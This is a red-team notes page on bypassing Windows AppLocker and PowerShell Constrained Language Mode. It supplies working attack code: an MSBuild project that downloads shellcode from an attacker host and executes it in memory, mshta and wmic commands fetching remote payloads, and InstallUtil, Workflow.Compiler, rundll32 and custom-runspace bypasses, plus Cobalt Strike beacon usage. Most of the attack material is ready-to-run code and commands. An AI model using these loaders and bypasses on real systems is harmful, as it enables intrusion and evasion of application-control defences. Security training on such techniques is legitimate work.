---
title: Application Whitelisting
description: "AppLoker is an application whitelisting technology for Windows Operating Systems. Restricts applications ans scripts that are allowed to run on a machine,..."
---

# AppLocker

AppLoker is an application whitelisting technology for Windows Operating Systems. Restricts applications ans scripts that are allowed to run on a machine, defined through a set of policies which are set by GPO.

Rules can be based on file attributes such as *name*, *version*, *hash* or *path*, and can *allow* or *deny*.

AppLocker will also change the PowerShell Language Mode from `FullLanguage` to `ConstrainedLanguage`.

There are three primary AppLocker rule categories, which can be combined as needed. 

1. Based on `file paths`: whitelist a single file based on its filename and path or recursively include the contents of a directory.
2. Based on `file hash`: Could whitelist a single file to execute regardless of the location. Applocker uses SHA256 to avoid collisions.
3. Based on a `digital signature`: could whitelist all files from an individual publisher with a single signature, which simplifies whitelisting across version updates.


## Policy Enumeration

The policy can be read from two places, directly from GPO or from the local registry of a machine. 

### Via downloading GPO

We can read the GPO by downloading the `Regitry.pol`.

```
beacon> powershell Get-DomainGPO -Domain corp.local | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath

displayname gpcfilesyspath                                                                        
----------- --------------                                                                        
AppLocker   \\corp.local\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}

beacon> download \\corp.local\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol
[*] started download of \\corp.local\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol (7616 bytes)
[*] download of Registry.pol is complete
```

We can parse the pol file with `Parse-PolFile` from the `GPRegistryPolicyParser` package.

* [https://github.com/PowerShell/GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser)

```powershell
Parse-PolFile .\Registry.pol

KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\a61c8b2c-a319-4cd0-9690-d2177cad7b51
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 700
ValueData   : <FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="(Default Rule) All files located in the
              Windows folder" Description="Allows members of the Everyone group to run applications that are located
              in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition
              Path="%WINDIR%\*"/></Conditions></FilePathRule>
```

### Via local registry

We can query the registry at `HKLM:Software\Policies\Microsoft\Windows\SrpV2` to obtain the information.

```powershell
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
```

> **Note**: We can see that DLL enforcement is not commonly enabled.

```powershell
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
```

## Writeable Paths

The default rules allow execution on `C:\Program Files` and `C:\Windows` including subdirectories. So moving laterally to a protected machine via psexec is trivial since the service executable is written into `C:\Windows`.

But, if you're on a protected machine as a standard user, there are several directories inside `C:\Windows` where we can write, one for example is `C:\Windows\Tasks`. This would allow us to copy an executable into this directory and run it.

> **Note**: When enumerating the rules, we can find some additional weak rules that sysadmins have set. An example is:
>
> `<FilePathCondition Path="*\AppV\*"/>`

## Trusted folders

The default rules for AppLocker whitelist all executables and scripts located in `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows`. This is a logical choice since it is assumed that non-admin users cannot write executables or scripts into these directories.

We can use `AccessChk.exe` from SysInternals to check common writeable directories:

```
c:\Tools\SysinternalsSuite>.\accesschk.exe "student" c:\windows -wus

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

RW c:\windows\Tasks
RW c:\windows\Temp
RW c:\windows\tracing
RW c:\windows\appcompat\appraiser\Appraiser_AlternateData.cab
RW c:\windows\Registration\CRMLog
RW c:\windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Dlna\DeviceIcons
RW c:\windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Dlna\DeviceIcons\ad86e422-6d85-3ceb-bca5-aca51ba00836_0.png
RW c:\windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Dlna\DeviceIcons\ad86e422-6d85-3ceb-bca5-aca51ba00836_1.png
RW c:\windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Dlna\DeviceIcons\ad86e422-6d85-3ceb-bca5-aca51ba00836_2.jpg
RW c:\windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Dlna\DeviceIcons\ad86e422-6d85-3ceb-bca5-aca51ba00836_3.jpg
RW c:\windows\System32\FxsTmp
 W c:\windows\System32\Tasks
 W c:\windows\System32\Com\dmp
RW c:\windows\System32\Microsoft\Crypto\RSA\MachineKeys
 W c:\windows\System32\spool\PRINTERS
 W c:\windows\System32\spool\SERVERS
RW c:\windows\System32\spool\drivers\color
```

It can be checked mannualy with:

```
c:\Tools\SysinternalsSuite>icacls.exe c:\windows\tasks
c:\windows\tasks NT AUTHORITY\Authenticated Users:(RX,WD)
                 BUILTIN\Administrators:(F)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(F)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 CREATOR OWNER:(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files\
```

Once we found a **writeable and executable** path we can locate our payload there and execute it.

```
c:\windows\tasks\dropper.exe
```

## Alternate Data Stream

An Alternate Data Stream (ADS) is a binary file attribute that contains metadata. We can leverage this to append the binary data of additional streams to the original file.

For testing we are going to create a test.js

```
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
```

We need to find a file which is writeable and executable by our user. Once found we can copy our payload with `type` from `cmd.exe` to the alternate data stream:

```
type test.js "C:\Program files (x86)\MyProgram\myprogram_001.log:test.js"
```

Once copied we can check it with `dir /r` if it's stored successfully. Finally just execute it with `wscript`.

```
wscript.exe "C:\Program files (x86)\MyProgram\myprogram_001.log:test.js"
```

## Third Party Execution

AppLocker only enforces rules against native Windows executable data file types. We can use engines like `python` or `pearl` if installed to easilly bypass.

```
C:\Users\benjugat> echo print("bypass") > test.py
C:\Users\benjugat> python test.py
bypass
```

## LOLBAS

**Living Off The Land Binaries, Scripts and Libraries (LOLBAS)** are executables and scripts thant come as part of Windows but allow for arbitrary code execution. They allow us to bypass AppLocker, because they're allowed to execute under the normal criteia and may also be digitally signed by Microsoft.

* [https://lolbas-project.github.io/](https://lolbas-project.github.io/)

### MSBuild

And example is `MSBuild`, if is not blocked, it can be used to execute arbitrary C# code from a `.csproj` file. This could be turned into a basic shellcode injector.

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe code.csproj
```

```c#
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://attacker.com";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

### InstallUtil

`InstallUtil.exe` which is a command-line utility allows us to install and uninstall server resources by executing the installer components in a specified assembly.

Since install needs admin privileges we are going to use the uninstall function.

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Bypassing AppLocker...");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```

Visual Studio can't locate `System.Configuration.Install`, we need to mannually add the assembly reference.

Right-click the `References` folder, then `Add Reference` and search `System.Configuration.Install`.

Visual Studio can't locate `System.Management.Atomation.Runspaces`, we need to mannually add the assembly reference.

Right-click the `References` folder, then `Add Reference`.

![System.Management](../../images/vstudio-addreference.png)

If we cant find it, select `Browse`:

```
C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\
```

And add `System.Management.Automation.dll`.

Once compiled we must invoke it through installutil with `/logfile=` to avoid logging to a file, `/LogToConsole=false` to suppress output and `/U` to trigger the uninstall method:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\uninstaller-dropper.exe
```

> **Note**: An error such as `(Exception from HRESULT: 0x80131515).` can occur if you download the `.exe` from internet. Try to send it encoded and uncoded in localhost. Or also can be unblocked doing rightclick on the windows exporer -> Properties -> Unblock.

```sh
certutil -encode uninstaller-dropper.exe enc.txt
certurtil -decode enc.txt uninstaller-dropper.exe
```

### Microsoft.Workflow.Compiler.exe

`Microsoft.Workflow.Compile.exe` is a signed binary located in `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\` which we can use to compile and execute our c# code.

It requires two arguments, the first one is an xml file with the flags for the compilation and the second one a dummy file for results.

To obtain our xml file we can use reflection to invoke the following method.

```powershell
$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$compilerparam.GenerateInMemory = $True
$pathvar = "code.txt"
$output = "C:\Tools\run.xml"
$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
Move-Item $tmp $output
```

Output file:

```xml
<?xml version="1.0" encoding="utf-8"?>
<CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
  <files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
    <d2p1:string>code.txt</d2p1:string>
  </files>
  <parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
    <assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></coreAssemblyFileName>
    <embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</generateExecutable>
    <generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">true</generateInMemory>
    <includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</includeDebugInformation>
    <linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <outputName i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</treatWarningsAsErrors>
    <warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">-1</warningLevel>
    <win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <d2p1:checkTypes>false</d2p1:checkTypes>
    <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>
    <d2p1:compilerOptions i:nil="true" />
    <d2p1:generateCCU>false</d2p1:generateCCU>
    <d2p1:languageToUse>CSharp</d2p1:languageToUse>
    <d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" />
    <d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" />
    <d2p1:mtInfo i:nil="true" />
    <d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" />
  </parameters>
</CompilerInput>
```

> **Note**: It works in different computers, so directly use it.

`$pathvar` variable stores our code filename. It needs to contain a class that inherits from the Activity class of `System.Workflow.ComponentModel` namespace and mus contain the code we want to execute inside its constructor.

File  `code.txt`

```csharp
using System;
using System.Workflow.ComponentModel;
public class Run : Activity{
    public Run() {
        Console.WriteLine("I executed!");
    }
}
```

```
PS C:\Tools> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe .\run.xml results.xml
I executed!
```

### mshta

Microsoft HTML Applications (MSHTA) work by executing `.hta` files with the native `mshta.exe` application. HTML apps include embedded jscript or vbs code that is parsed and executed by `mshta.exe`.

Since `mshta.exe` located in `c:\windows\system32\` is a signed microsoft application, it is commonly whitelisted.

We can execute our Jscript code with `mshta.exe` instead of `wscript.exe` using the following HTA template bypassing App Locker restrictions.


```html
<html> 
<head> 
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```

```
mshta.exe code.hta
mshta.exe http://attacker.ip/code.hta
```

### XSL Transformation

The process of XSLT uses Extensible Stylesheet Language (.xsl) documents to transform an XML document into a different format such as XHTML.

Part of the XSL transformation specification allows execution of embedded Jscript code when processing the supplied XML document.

First we must craft a malicious XSL document and put it in our http server.

```xsl
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		
			var r = new ActiveXObject("WScript.Shell");
			r.Run("cmd.exe");
		
	</ms:script>
</stylesheet>
```

Finally use `wmic`by specifying the verb `get` and the `/fomat` followed by the URL of the XSL file.

```
wmic process get brief /format:"http://attacker.ip/test.xsl"
```

## Bypass with DLLs

The default ruleset doesn't protect against loading arbitrary DLLs. IF we can create an unmanaged DLL, we are able to load it, and trigger exported APIs to achieve code execution.

```csharp
#include <Windows.h>
#pragma comment (lib, "user32.lib")


BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  fdwReason, LPVOID lpReserved) {

    switch (fdwReason)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
      break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI Go(void) {
	
	MessageBox(
		NULL,
		L"Hi RT Notes!",
		L"HI",
        MB_OK
	);
	 
		 return TRUE;
	}
}
```

Once exported we can use `rundll32.exe` to call our funtcion:

```
rundll32.exe benjugat.dll,Go
```

### Beacon DLL

If DLL enforcement is not enabled, we can call exported functions from DLLs on disk via `rundll32`. Beacon's DLL exposes several exports including `DllMain` and `StartW`.

These can be changed in the Artifact Kit under `src-main/dllmain.def`.

```beacon
C:\Windows\System32\rundll32.exe http_x64.dll,StartW
```

# PowerShell Constrained Language Mode (CLM)

The PowerShell `execution policy` restricts the execution of scripts, but this is a weak protection mechanism which can be easily bypassed with the built-in "Bypass" execution policy. However, the more robust Language Modes limit the functionality to avoid execution of code like our shellcode runner and operates at three distinct levels. With Applocker appears another one.

* `FullLanguage`: Allows all cmdlets ant the entire .NET framework as well as c# execution.
* `NoLanguage`: Disallows all script text.
* `RestrictedLangauge`: Offers a compromise, allowing default cmdlets but heavily restricting much else.
* `ConstrainedLanguage`: Allows scripts that are in whitelisted locations or otherwise comply with a whitelisting rule can execute with full functionality. Excludes calls to the .NETframework, execution of C# code and reflection.

```
PS C:\Tools> [Math]::Cos(1)
Cannot invoke method. Method invocation is supported only on core types in this language mode.
At line:1 char:1
+ [Math]::Cos(1)
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage
```

The warning shows us that we cannot access cosine function in the Math namespace of .Net.

```
PS C:\Tools> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

## Custom Runspaces

`PowerShell.exe` is essentially a GUI application handling input and output. The real functionality lies inside the `System.Management.Automation.dll` managed DLL, which `PowerShell.exe` calls to create a runspace.

It is possible to leverage multithreading and parallel task execution through either jobs or runspaces. The APIs for creating a runspace are public and available to managed code written in C#.

So we can code a C# app that creates a custom Powershell runspace and executes our script inside.

> **Note**: We need to find a way to bypass AppLocker in order to execute this c# code (.exe).

> **Important**: Create a `C# Console Aplication (.NET Framework)` project in Visual Studio.

```c#
using System;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class MSBuildTest :  Task, ITask
{
    public override bool Execute()
    {
        using (var runspace = RunspaceFactory.CreateRunspace())
        {
          runspace.Open();

          using (var posh = PowerShell.Create())
          {
            posh.Runspace = runspace;
            posh.AddScript("$ExecutionContext.SessionState.LanguageMode");
                                    
            var results = posh.Invoke();
            var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
            
            Console.WriteLine(output);
          }
        }

    return true;
  }
}
```

Visual Studio can't locate `System.Management.Atomation.Runspaces`, we need to mannually add the assembly reference.

Right-click the `References` folder, then `Add Reference`.

![System.Management](../../images/vstudio-addreference.png)

If we cant find it, select `Browse`:

```
C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\
```

And add `System.Management.Automation.dll`.

```
PS C:\Windows\Tasks> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
PS C:\Windows\Tasks> .\CLMBypass.exe
PS C:\Windows\Tasks> type C:\Tools\test.txt
FullLanguage
PS C:\Windows\Tasks> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

To avoid compiling everytime, I modified the script to execute the command passed as argument.

```csharp
using System;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: CLMBypass.exe <command>");
                return;
            }
            String cmd = String.Join(" ", args);

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.AddCommand("Out-String");

            var results = ps.Invoke();
            StringBuilder output = new StringBuilder();

            foreach (PSObject result in results)
            {
                output.AppendLine(result.ToString());
                Console.Write(result);
            }

            foreach (ErrorRecord error in ps.Streams.Error)
            {
                output.AppendLine(error.ToString());
                Console.Write(error);
            }

            File.WriteAllText("output.txt", output.ToString());
        }
    }
}
```

```
PS C:\Windows\Tasks> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
PS C:\Windows\Tasks> .\CLMBypass.exe '$ExecutionContext.SessionState.LanguageMode'
FullLanguage
```

> **Note**: Although `powershell.exe` is denied to everyone by AppLocker it's possible to execute powershell commands with that method.

## Cobalt Strike

With Cobalt Strike is simply using `powerpick` command in order to bypass ConstrainedLanguage.

```powershell
beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

```powershell
beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

This can also be done in C#.

